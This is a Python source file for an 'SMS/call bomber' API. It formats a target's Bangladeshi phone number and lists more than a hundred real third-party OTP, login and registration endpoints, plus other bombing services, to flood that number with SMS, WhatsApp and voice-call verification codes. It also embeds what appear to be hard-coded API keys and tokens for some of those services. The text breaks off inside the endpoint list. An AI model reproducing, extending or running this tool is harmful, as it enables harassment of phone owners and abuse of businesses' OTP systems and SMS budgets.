# app.py — Final Bomber API (152 APIs from BD-V1)
from fastapi import FastAPI, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import uvicorn
import asyncio
import aiohttp
import time
import os
import re
import json

app = FastAPI(title="🔥 BD ULTIMATE BOMBER API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================
# PHONE FORMATTER
# ============================================================

def format_phone(phone):
    cleaned = re.sub(r'\D', '', phone)
    if len(cleaned) == 11 and cleaned.startswith('01'):
        raw = cleaned[2:]
        with_0 = cleaned
        with_88 = f"88{raw}"
        with_880 = f"880{raw}"
        with_plus88 = f"+88{raw}"
        with_plus880 = f"+880{raw}"
    elif len(cleaned) == 10:
        raw = cleaned
        with_0 = f"0{cleaned}"
        with_88 = f"88{cleaned}"
        with_880 = f"880{cleaned}"
        with_plus88 = f"+88{cleaned}"
        with_plus880 = f"+880{cleaned}"
    else:
        raw = cleaned[-10:] if len(cleaned) > 10 else cleaned
        with_0 = f"0{raw}"
        with_88 = f"88{raw}"
        with_880 = f"880{raw}"
        with_plus88 = f"+88{raw}"
        with_plus880 = f"+880{raw}"
    return {
        'raw': raw,
        'with_0': with_0,
        'with_88': with_88,
        'with_880': with_880,
        'with_plus88': with_plus88,
        'with_plus880': with_plus880
    }

# ============================================================
# ALL 152 APIS
# ============================================================

APIS = []

# ============================================================
# GET APIS
# ============================================================

GET_APIS = [
    {"name": "Bikroy.com", "method": "GET", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", "type": "sms", "key": "with_0"},
    {"name": "Grameenphone MyGP", "method": "GET", "url": "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0", "type": "sms", "key": "raw"},
    {"name": "Shukhee.com", "method": "GET", "url": "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn", "type": "sms", "key": "raw"},
    {"name": "MedEasy Health", "method": "GET", "url": "https://api.medeasy.health/api/send-otp/+88{phone}/", "type": "sms", "key": "raw"},
    {"name": "Ultranet API", "method": "GET", "url": "http://ultranetrn.com.br/fonts/api.php?number={phone}", "type": "call", "key": "with_0"},
    {"name": "eCourier API", "method": "GET", "url": "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}", "type": "sms", "key": "with_0"},
    {"name": "Binge.buzz GET", "method": "GET", "url": "https://ss.binge.buzz/otp/send/login{phone}", "type": "sms", "key": "with_0"},
    {"name": "Daktarbhai GET", "method": "GET", "url": "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login", "type": "sms", "key": "raw"},
    {"name": "APU Inky API", "method": "GET", "url": "https://apu-inky.vercel.app/send?number={phone}", "type": "call", "key": "with_0"},
    {"name": "Bioscope Live", "method": "GET", "url": "https://stage.bioscopelive.com/en/login/send-otp?phone=88{phone}&operator=bd-otp", "type": "sms", "key": "raw"},
    {"name": "W8 MedEasy", "method": "GET", "url": "https://api.medeasy.health/api/send-otp/{phone}/", "type": "sms", "key": "with_plus88"},
    {"name": "Call Bomber 1", "method": "GET", "url": "https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={phone}", "type": "call", "key": "with_0"},
    {"name": "Call Bomber 2", "method": "GET", "url": "https://call-bomber.vercel.app/bomb?num={phone}", "type": "call", "key": "with_0"},
    {"name": "FreeFire Call", "method": "GET", "url": "https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=1", "type": "call", "key": "with_0"},
    {"name": "BD Call Master", "method": "GET", "url": "https://bomberr.onrender.com/num={phone}", "type": "call", "key": "with_0"},
    {"name": "Bolbet Call", "method": "GET", "url": "https://bolbet-liart.vercel.app/?key=roots&number={phone}", "type": "call", "key": "with_0"},
    {"name": "Bomberr Xtreme", "method": "GET", "url": "https://bomberr2.onrender.com/bomb?num={phone}", "type": "call", "key": "with_0"},
    {"name": "BD Voice OTP", "method": "GET", "url": "https://bomberrr.vercel.app/?key=roots&number={phone}", "type": "call", "key": "with_0"},
    {"name": "Jockey WhatsApp", "method": "GET", "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/{phone}?whatsapp=true", "type": "whatsapp", "key": "with_plus88"},
    {"name": "XB Shudokko", "method": "GET", "url": "http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no={phone}&email=xbomber_public%40gmail.com&verification_type=registration", "type": "sms", "key": "with_0"},
    {"name": "XB CINESPOT", "method": "GET", "url": "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-{phone}/operator-All/send", "type": "sms", "key": "with_0"},
    {"name": "XB Health Plus", "method": "GET", "url": "http://45.114.85.19:8080/v3/otp/send?msisdn=88{phone}", "type": "sms", "key": "raw"},
    {"name": "XB IQRA", "method": "GET", "url": "http://apibeta.iqra-live.com/api/v2/sent-otp/{phone}", "type": "sms", "key": "with_0"},
]

# ============================================================
# POST APIS
# ============================================================

POST_APIS = [
    {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "data": lambda p: json.dumps({"full_name": "Test User", "email_address": "test@example.com", "company_name": "Test", "phone_number": p['with_0']}), "type": "sms"},
    {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "data": lambda p: json.dumps({"mobile": f"+880{p['raw']}", "deviceToken": "web", "language": "en", "os": "web"}), "type": "sms"},
    {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "data": lambda p: json.dumps({"phone": p['with_0'], "intent": "login"}), "type": "sms"},
    {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "data": lambda p: json.dumps({"phone": f"+88{p['raw']}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}), "type": "sms"},
    {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "data": lambda p: json.dumps({"mobile": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "Shikho", "method": "POST", "url": "https://api.shikho.com/auth/v2/send/sms", "data": lambda p: json.dumps({"auth_type": "login", "phone": p['with_0'], "vendor": "shikho", "type": "student"}), "type": "sms"},
    {"name": "Daraz", "method": "POST", "url": "https://member.daraz.com.bd/send-otp", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "Foodpanda", "method": "POST", "url": "https://foodpanda.com.bd/api/v1/otp/send", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "Pathao", "method": "POST", "url": "https://api.pathao.com/api/v1/otp/request", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "Chaldal", "method": "POST", "url": "https://api.chaldal.com/api/v1/otp/send", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "BeepKart", "method": "POST", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "data": lambda p: json.dumps({"phone": p['with_0'], "city": 362}), "type": "sms"},
    {"name": "Smytten", "method": "POST", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "data": lambda p: json.dumps({"phone": p['with_0'], "email": "test@example.com"}), "type": "sms"},
    {"name": "MyHubble Money", "method": "POST", "url": "https://api.myhubble.money/v1/auth/otp/generate", "data": lambda p: json.dumps({"phoneNumber": p['with_0'], "channel": "SMS"}), "type": "sms"},
    {"name": "Housing.com", "method": "POST", "url": "https://login.housing.com/api/v2/send-otp", "data": lambda p: json.dumps({"phone": p['with_0'], "country_url_name": "in"}), "type": "sms"},
    {"name": "RentoMojo", "method": "POST", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "Khatabook", "method": "POST", "url": "https://api.khatabook.com/v1/auth/request-otp", "data": lambda p: json.dumps({"phone": p['with_0'], "app_signature": "wk+avHrHZf2"}), "type": "sms"},
    {"name": "Animall", "method": "POST", "url": "https://animall.in/zap/auth/login", "data": lambda p: json.dumps({"phone": p['with_0'], "signupPlatform": "NATIVE_ANDROID"}), "type": "sms"},
    {"name": "Cosmofeed", "method": "POST", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "data": lambda p: json.dumps({"phone": p['with_0'], "version": "1.4.28"}), "type": "sms"},
    {"name": "Spencer's", "method": "POST", "url": "https://jiffy.spencers.in/user/auth/otp/send", "data": lambda p: json.dumps({"mobile": p['with_0']}), "type": "sms"},
    {"name": "Deshal.net", "method": "POST", "url": "https://app.deshal.net/api/auth/login", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "Grameenphone Web Login", "method": "POST", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "data": lambda p: json.dumps({"msisdn": p['with_0']}), "type": "sms"},
    {"name": "BusBD.com.bd", "method": "POST", "url": "https://api.busbd.com.bd/api/auth", "data": lambda p: json.dumps({"phone": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "Apex4u.com", "method": "POST", "url": "https://api.apex4u.com/api/auth/login", "data": lambda p: json.dumps({"phoneNumber": p['with_0']}), "type": "sms"},
    {"name": "Fundesh.com.bd", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "data": lambda p: json.dumps({"msisdn": p['with_0']}), "type": "sms"},
    {"name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "data": lambda p: json.dumps({"mobile": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "Qcoom.com", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "data": lambda p: json.dumps({"mobileNumber": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "Garibookadmin.com", "method": "POST", "url": "https://api.garibookadmin.com/api/v4/user/login", "data": lambda p: json.dumps({"mobile": f"+880{p['raw']}", "recaptcha_token": "garibookcaptcha", "channel": "web"}), "type": "sms"},
    {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "data": lambda p: json.dumps({"mobile": p['with_0']}), "type": "sms"},
    {"name": "Robi DA API", "method": "POST", "url": "https://da-api.robi.com.bd/da-nll/otp/send", "data": lambda p: json.dumps({"msisdn": p['with_0']}), "type": "sms"},
    {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "data": lambda p: json.dumps({"phoneNumber": p['with_0'], "requestType": "send", "emailConsent": True, "whatsappConsent": True}), "type": "sms"},
    {"name": "Addatimes.com", "method": "POST", "url": "https://app.addatimes.com/api/login", "data": lambda p: json.dumps({"phone": p['with_0'], "country_code": "BD"}), "type": "sms"},
    {"name": "DeeptoPlay.com", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "data": lambda p: json.dumps({"email": "user@example.com", "phone_number": f"88{p['raw']}"}), "type": "sms"},
    {"name": "Chorki.com", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "data": lambda p: json.dumps({"number": f"+880{p['raw']}"}), "type": "sms"},
    {"name": "Arogga.com", "method": "POST", "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", "data": lambda p: f"mobile={p['with_0']}&fcmToken=&referral=", "type": "sms"},
    {"name": "BdTickets.com", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "data": lambda p: json.dumps({"phone": f"+880{p['raw']}"}), "type": "sms"},
    {"name": "Binge.buzz POST", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "data": lambda p: json.dumps({"mobile": p['with_0']}), "type": "sms"},
    {"name": "SendMySMS", "method": "POST", "url": "https://sendmysms.net/send-otp.php", "data": lambda p: f"phonenumber={p['with_0']}", "type": "sms"},
    {"name": "Eonbazar", "method": "POST", "url": "https://app.eonbazar.com/api/auth/login", "data": lambda p: json.dumps({"method": "otp", "mobile": p['with_0']}), "type": "sms"},
    {"name": "NESCO SSL Wireless", "method": "POST", "url": "http://nesco.sslwireless.com/api/v1/login", "data": lambda p: json.dumps({"phone_number": p['with_0']}), "type": "sms"},
    {"name": "Quizgiri POST", "method": "POST", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "data": lambda p: json.dumps({"phone": p['raw'], "country_code": "+880", "fcm_token": None}), "type": "sms"},
    {"name": "Bazar365", "method": "POST", "url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", "data": lambda p: json.dumps({"phone": p['with_0'], "applicationChannel": "WEB_APP"}), "type": "sms"},
    {"name": "Wakefit", "method": "POST", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "data": lambda p: json.dumps({"mobile": p['with_0']}), "type": "sms"},
    {"name": "Hungama OTP", "method": "POST", "url": "https://communication.api.hungama.com/v1/communication/otp", "data": lambda p: json.dumps({"mobileNo": p['with_0'], "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}), "type": "sms"},
    {"name": "Doubtnut", "method": "POST", "url": "https://api.doubtnut.com/v4/student/login", "data": lambda p: json.dumps({"phone_number": p['with_0'], "language": "en"}), "type": "sms"},
    {"name": "PenPencil", "method": "POST", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "data": lambda p: json.dumps({"organizationId": "5eb393ee95fab7468a79d189", "mobile": p['with_0']}), "type": "sms"},
    {"name": "Bioscope Plus", "method": "POST", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", "data": lambda p: json.dumps({"number": p['with_plus88']}), "type": "sms"},
    {"name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "data": lambda p: json.dumps({"mobile_no": p['with_0']}), "type": "sms"},
    {"name": "Jayabaji", "method": "POST", "url": "https://www.jayabaji3.com/api/register/check-username", "data": lambda p: json.dumps({"username": f"user{hash(p['raw']) % 100000}", "email": "", "mobileno": p['raw'], "language": "bn", "langCountry": "bn-bd"}), "type": "sms"},
    {"name": "PKLuck2 Register", "method": "POST", "url": "https://www.pkluck2.com/wps/verification/sms/register", "data": lambda p: json.dumps({"countryDialingCode": "880", "mobileNo": p['with_0']}), "type": "sms"},
    {"name": "PKLuck2 NoLogin", "method": "POST", "url": "https://www.pkluck2.com/wps/verification/sms/noLogin", "data": lambda p: json.dumps({"mobileNum": p['with_0'], "countryDialingCode": "880"}), "type": "sms"},
    {"name": "Ilyn Global", "method": "POST", "url": "https://api.ilyn.global/auth/signup", "data": lambda p: json.dumps({"phone": {"code": "BD", "number": p['with_plus88']}, "provider": "sms"}), "type": "sms"},
    {"name": "Sheba", "method": "POST", "url": "https://accountkit.sheba.xyz/api/shooot-otp", "data": lambda p: json.dumps({"mobile": p['with_plus88'], "app_id": "8329815A6D1AE6DD", "api_token": "zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}), "type": "sms"},
    {"name": "Sailor Clothing", "method": "POST", "url": "https://backend.sailor.clothing/api/v2/auth/password/forget_request", "data": lambda p: json.dumps({"email_or_phone": p['with_0'], "send_code_by": "phone"}), "type": "sms"},
    {"name": "Isho", "method": "POST", "url": "https://www.isho.com/register_otp", "data": lambda p: f"_token=dummy&phone={p['with_0']}&email=test@gmail.com", "type": "sms"},
    {"name": "AppLink", "method": "POST", "url": "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", "data": lambda p: json.dumps({"msisdn": p['with_88']}), "type": "sms"},
    {"name": "MyGP Cinematic", "method": "POST", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}", "data": lambda p: "{}", "type": "sms", "key": "with_plus88"},
    {"name": "GP Flexiplan", "method": "POST", "url": "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation", "data": lambda p: json.dumps({"payment_mode": "mobile_balance", "msisdn": p['with_0'], "bundle_id": 60817, "is_login": False}), "type": "sms"},
    {"name": "GP FWA", "method": "POST", "url": "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", "data": lambda p: json.dumps({"phone": p['with_0'], "email": "", "language": "en"}), "type": "sms"},
    {"name": "EBMEB eFiling", "method": "POST", "url": "https://efiling.ebmeb.gov.bd/index.php/eiinsim/sendotp", "data": lambda p: f"mobile={p['with_0']}", "type": "sms"},
    {"name": "Binge.buzz Red", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "data": lambda p: f"phone={p['with_0']}", "type": "sms"},
    {"name": "Daktarbhai Red", "method": "POST", "url": "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login", "data": None, "type": "sms", "key": "raw"},
    {"name": "Shohoz XRides", "method": "POST", "url": "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code", "data": lambda p: json.dumps({"mobile": p['with_0']}), "type": "sms"},
    {"name": "Addabaji.mobi", "method": "POST", "url": "https://addabaji.mobi/twocups-v1-robi/otp.php", "data": lambda p: f"msisdn={p['with_0']}", "type": "sms"},
    {"name": "Quizgiri Red", "method": "POST", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "data": lambda p: json.dumps({"phone": p['raw'], "country_code": "+880", "fcm_token": None}), "type": "sms"},
    {"name": "BTCL MyBTCL", "method": "POST", "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", "data": lambda p: json.dumps({"phoneNbr": p['with_0'], "email": "", "OTPType": 1, "userName": ""}), "type": "call"},
    {"name": "BTCL PhoneBill", "method": "POST", "url": "https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json", "data": lambda p: json.dumps({"phoneNbr": p['with_0'], "email": "", "OTPType": 1, "userName": ""}), "type": "call"},
    {"name": "BTCL BDIA", "method": "POST", "url": "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1", "data": lambda p: f"actionType=otpSend&mobileNo={p['with_0']}", "type": "call"},
    {"name": "IMO OTP", "method": "POST", "url": "https://api.imo.im/v1/account/request_otp", "data": lambda p: json.dumps({"phone_number": p['with_plus88'], "country_code": "BD"}), "type": "call"},
    {"name": "IMO Voice", "method": "POST", "url": "https://api.imo.im/v1/account/request_voice_otp", "data": lambda p: json.dumps({"phone_number": p['with_plus88'], "country_code": "BD"}), "type": "call"},
    {"name": "W8 BTCL MyBTCL", "method": "POST", "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", "data": lambda p: json.dumps({"phoneNbr": p['with_0'], "email": "", "OTPType": 1, "userName": ""}), "type": "call"},
    {"name": "W8 BTCL PhoneBill", "method": "POST", "url": "https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json", "data": lambda p: json.dumps({"phoneNbr": p['with_0'], "email": "", "OTPType": 1, "userName": ""}), "type": "call"},
    {"name": "W8 BTCL BDIA", "method": "POST", "url": "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1", "data": lambda p: f"actionType=otpSend&mobileNo={p['with_0']}", "type": "call"},
    {"name": "W8 Bioscope Plus", "method": "POST", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", "data": lambda p: json.dumps({"number": p['with_plus88']}), "type": "sms"},
    {"name": "W8 Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "data": lambda p: json.dumps({"mobile_no": p['with_0']}), "type": "sms"},
    {"name": "W8 Deepto Play", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "data": lambda p: json.dumps({"number": p['with_plus880']}), "type": "sms"},
    {"name": "W8 BD Tickets", "method": "POST", "url": "https://api.bdtickets.com:20100/v1/auth", "data": lambda p: json.dumps({"createUserCheck": True, "phoneNumber": p['with_plus88'], "applicationChannel": "WEB_APP"}), "type": "sms"},
    {"name": "W8 Apex4U", "method": "POST", "url": "https://api.apex4u.com/api/auth/login", "data": lambda p: json.dumps({"phoneNumber": p['with_0']}), "type": "sms"},
    {"name": "W8 Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "W8 Ilyn Global", "method": "POST", "url": "https://api.ilyn.global/auth/signup", "data": lambda p: json.dumps({"phone": {"code": "BD", "number": p['with_plus88']}, "provider": "sms"}), "type": "sms"},
    {"name": "W8 Arogga", "method": "POST", "url": "https://api.arogga.com/auth/v1/sms/send/", "data": lambda p: f"mobile={p['with_0']}", "type": "sms"},
    {"name": "W8 ePharma", "method": "POST", "url": "https://epharma.com.bd/authentification/send-otp", "data": lambda p: f"number={p['with_plus88']}", "type": "sms"},
    {"name": "W8 TheClinicall", "method": "POST", "url": "https://theclinicall.com/bkapi/auth/user/otp/signin", "data": lambda p: json.dumps({"countryCode": "BD", "dialCode": "880", "phone": p['raw']}), "type": "sms"},
    {"name": "W8 Care Box", "method": "POST", "url": "https://www.api-care-box.click/api/user/register/", "data": lambda p: json.dumps({"Name": "Test User", "Phone": p['with_plus880']}), "type": "sms"},
    {"name": "W8 Renix Care", "method": "POST", "url": "https://renixapi.renixcare.com/sms-api/send-otp", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "W8 Sailor Clothing", "method": "POST", "url": "https://backend.sailor.clothing/api/v2/auth/password/forget_request", "data": lambda p: json.dumps({"email_or_phone": p['with_0'], "send_code_by": "phone"}), "type": "sms"},
    {"name": "W8 Isho", "method": "POST", "url": "https://www.isho.com/register_otp", "data": lambda p: f"_token=dummy&phone={p['with_0']}&email=test@gmail.com", "type": "sms"},
    {"name": "W8 Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "data": lambda p: json.dumps({"msisdn": p['with_0']}), "type": "sms"},
    {"name": "W8 Garibook", "method": "POST", "url": "https://api.garibookadmin.com/api/v3/user/login", "data": lambda p: json.dumps({"mobile": p['with_0'], "recaptcha_token": "garibookcaptcha", "channel": "web"}), "type": "sms"},
    {"name": "W8 Sheba", "method": "POST", "url": "https://accountkit.sheba.xyz/api/shooot-otp", "data": lambda p: json.dumps({"mobile": p['with_plus88'], "app_id": "8329815A6D1AE6DD", "api_token": "zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}), "type": "sms"},
    {"name": "W8 Shombhob", "method": "POST", "url": "https://shombhob.com/api/otp-login", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "W8 AppLink", "method": "POST", "url": "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", "data": lambda p: json.dumps({"msisdn": p['with_88']}), "type": "sms"},
    {"name": "W8 MyGP Cinematic", "method": "POST", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}", "data": lambda p: "{}", "type": "sms", "key": "with_plus88"},
    {"name": "W8 GP Web Login", "method": "POST", "url": "https://webloginda.grameenphone.com/backend/api/v1/otp", "data": lambda p: f"msisdn={p['with_0']}", "type": "sms"},
    {"name": "W8 GP Flexiplan", "method": "POST", "url": "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation", "data": lambda p: json.dumps({"payment_mode": "mobile_balance", "msisdn": p['with_0'], "bundle_id": 60817, "is_login": False}), "type": "sms"},
    {"name": "W8 GP FWA", "method": "POST", "url": "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", "data": lambda p: json.dumps({"phone": p['with_0'], "email": "", "language": "en"}), "type": "sms"},
    {"name": "W8 Mevrik", "method": "POST", "url": "https://channels.mevrik.com:4202/api/v1/claim-session", "data": lambda p: json.dumps({"data": {"user_ref": p['with_0'], "name": "Test User"}}), "type": "whatsapp"},
    {"name": "W8 Jayabaji", "method": "POST", "url": "https://www.jayabaji3.com/api/register/check-username", "data": lambda p: json.dumps({"username": f"user{hash(p['raw']) % 100000}", "email": "", "mobileno": p['raw'], "language": "bn", "langCountry": "bn-bd"}), "type": "sms"},
    {"name": "W8 PKLuck2 Register", "method": "POST", "url": "https://www.pkluck2.com/wps/verification/sms/register", "data": lambda p: json.dumps({"countryDialingCode": "880", "mobileNo": p['with_0']}), "type": "sms"},
    {"name": "W8 PKLuck2 NoLogin", "method": "POST", "url": "https://www.pkluck2.com/wps/verification/sms/noLogin", "data": lambda p: json.dumps({"mobileNum": p['with_0'], "countryDialingCode": "880"}), "type": "sms"},
    {"name": "W8 Osudpotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "data": lambda p: json.dumps({"mobile": p['with_plus88'], "deviceToken": "web", "language": "en", "os": "web"}), "type": "sms"},
    {"name": "W8 Priyoshikkhaloy", "method": "POST", "url": "https://app.priyoshikkhaloy.com/api/user/register-login.php", "data": lambda p: f"mobile={p['with_0']}", "type": "sms"},
    {"name": "XB QuizGiri", "method": "POST", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "data": lambda p: json.dumps({"phone": p['raw'], "country_code": "+880", "fcm_token": None}), "type": "sms"},
    {"name": "XB Web Access", "method": "POST", "url": "http://27.131.15.19/lstyle/api/lsotprequest", "data": lambda p: json.dumps({"shortcode": "2494905", "msisdn": f"88{p['raw']}"}), "type": "sms"},
    {"name": "XB Dhaka bank", "method": "POST", "url": "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", "data": lambda p: json.dumps({"AccessToken": "", "TrackingNo": "", "mobileNo": p['with_0'], "otpSms": "", "product_id": "250", "requestChannel": "MOB", "trackingStatus": 5}), "type": "sms"},
    {"name": "XB CIRCLE", "method": "POST", "url": "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88{phone}", "data": None, "type": "sms", "key": "raw"},
    {"name": "XB Shajgoj", "method": "POST", "url": "https://shop.shajgoj.com/wp-admin/admin-ajax.php", "data": lambda p: f"action=xoo_ml_login_with_otp&xoo-ml-phone-login={p['with_0']}&xoo-ml-form-token=4840&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F", "type": "sms"},
    {"name": "XB KhaoDao", "method": "POST", "url": "https://api.eat-z.com/auth/customer/signin", "data": lambda p: json.dumps({"username": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "XB ALESHA_CARD", "method": "POST", "url": "https://aleshacard.com/api/register-otp?contact_no={phone}", "data": None, "type": "sms", "key": "with_0"},
    {"name": "XB TheMallBD", "method": "POST", "url": "https://themallbd.com/api/auth/otp_login", "data": lambda p: json.dumps({"phone_number": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "XB Fundesh", "method": "POST", "url": "https://win.fundesh.com.bd/authSrv/auth/generateOtp", "data": lambda p: json.dumps({"msisdn": p['with_0'], "clientId": "d2c_client"}), "type": "sms"},
    {"name": "XB Circle", "method": "POST", "url": "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88{phone}", "data": None, "type": "sms", "key": "raw"},
    {"name": "XB Vestige", "method": "POST", "url": "http://vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com/notification/api/v1/send/otp/v3", "data": lambda p: json.dumps({"mobileNumber": f"88{p['raw']}", "countryId": 22}), "type": "sms"},
    {"name": "XB Ajkerdeal", "method": "POST", "url": "https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup=null", "data": lambda p: json.dumps({"MobileOrEmail": p['with_0'], "Type": 2}), "type": "sms"},
    {"name": "XB Arogga", "method": "POST", "url": "https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0", "data": lambda p: f"mobile=+88{p['raw']}&fcmToken=&referral=", "type": "sms"},
    {"name": "XB OsudPotro", "method": "POST", "url": "https://api-2.osudpotro.com/api/v1/users/send_otp", "data": lambda p: json.dumps({"mobile": f"+88-{p['raw']}", "deviceToken": "web", "language": "en", "os": "web"}), "type": "sms"},
    {"name": "XB Nesco", "method": "POST", "url": "http://nesco.sslwireless.com/api/v1/login", "data": lambda p: f"phone_number={p['with_0']}", "type": "sms"},
    {"name": "XB ROBI WEB", "method": "POST", "url": "https://webapi.robi.com.bd/v1/send-otp", "data": lambda p: json.dumps({"phone_number": p['with_0']}), "type": "sms"},
    {"name": "XB Bongo", "method": "POST", "url": "https://api.bongo-solutions.com/auth/api/login/send-otp", "data": lambda p: json.dumps({"operator": "all", "msisdn": f"88{p['raw']}"}), "type": "sms"},
    {"name": "XB Ali2BD", "method": "POST", "url": "https://edge.ali2bd.com/api/consumer/v1/auth/login", "data": lambda p: json.dumps({"username": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "XB Rabbitholebd", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "data": lambda p: json.dumps({"mobile": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "XB Shopoth", "method": "POST", "url": "https://api.shopoth.com/shop/api/v1/otps/send", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "XB AProd", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "data": lambda p: json.dumps({"requestType": "send", "phoneNumber": f"+88{p['raw']}", "emailConsent": True, "whatsappConsent": True}), "type": "sms"},
